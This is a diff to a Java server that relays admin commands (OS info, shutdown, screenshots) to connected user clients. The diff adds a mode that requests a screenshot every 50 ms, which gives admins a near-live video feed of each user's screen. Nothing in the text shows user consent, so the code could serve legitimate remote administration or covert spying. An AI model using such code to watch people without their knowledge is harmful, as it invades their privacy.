@@ -94,6 +94,7 @@ public class Server {
         private final Socket clientSocket;
         private final String clientName;
         private PrintWriter out;
+        private boolean sendingScreenshots = false;
 
         public UserHandler(Socket socket, String clientName) {
             this.clientSocket = socket;
@@ -121,6 +122,10 @@ public class Server {
                     } else if (inputLine.startsWith("SCREENSHOT:")) {
                         String base64Image = inputLine.substring(11);
                         sendScreenshotToAdmins(base64Image);
+                    } else if (inputLine.equals("START_VIDEO")) {
+                        startSendingScreenshots();
+                    } else if (inputLine.equals("STOP_VIDEO")) {
+                        stopSendingScreenshots();
                     }
                 }
             } catch (IOException e) {
@@ -158,6 +163,25 @@ public class Server {
                     admin.sendScreenshot(base64Image);
                 }
             }
+        }
+
+        public void startSendingScreenshots() {
+            sendingScreenshots = true;
+            new Thread(() -> {
+                while (sendingScreenshots) {
+                    // Capture and send screenshot
+                    sendCommand("SCREENSHOT");
+                    try {
+                        Thread.sleep(50); // Adjust this value as needed
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }).start();
+        }
+
+        public void stopSendingScreenshots() {
+            sendingScreenshots = false;
         }
     }
 
@@ -207,7 +231,7 @@ public class Server {
             }
         }
 
-       public void handleAdminRequest(String clientMessage) {
+        public void handleAdminRequest(String clientMessage) {
             if (clientMessage.startsWith("OS_INFO")) {
                 for (UserHandler user : userClients) {
                     user.sendCommand("OS_INFO");
@@ -228,8 +252,15 @@ public class Server {
                 for (UserHandler user : userClients) {
                     user.sendCommand("SHUTDOWN");
                 }
+            } else if (clientMessage.startsWith("START_VIDEO")) {
+                for (UserHandler user : userClients) {
+                    user.startSendingScreenshots();
+                }
+            } else if (clientMessage.startsWith("STOP_VIDEO")) {
+                for (UserHandler user : userClients) {
+                    user.stopSendingScreenshots();
+                }
             }
         }
-
     }
 }
